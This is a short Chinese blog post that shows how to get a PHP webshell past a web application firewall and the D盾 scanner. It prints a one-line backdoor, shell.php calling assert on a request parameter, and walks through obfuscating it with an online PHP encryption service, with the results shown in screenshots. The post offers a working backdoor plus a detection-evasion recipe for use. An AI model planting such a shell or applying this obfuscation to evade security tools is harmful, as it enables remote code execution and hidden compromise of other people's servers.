---
title: "PHP 加密 Bypass WAF"
date: 2018-03-19T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['php']
categories: ['web', 'bypass']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

利用国内的 php 混淆加密绕过 waf

<!--more-->

原始代码

```
<?php
// shell.php
assert($_REQUEST['cmd']);
?>
```

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03//19/1521459418.jpg)

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03//19/1521459420.jpg)

D盾 4级

enphp.djunny.com

在线加密

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03//19/1521459422.jpg)

注意混淆选择字母 php 版本自行修改

加密后代码

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03//19/1521459424.jpg)

shell_encode.php

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03//19/1521459426.jpg)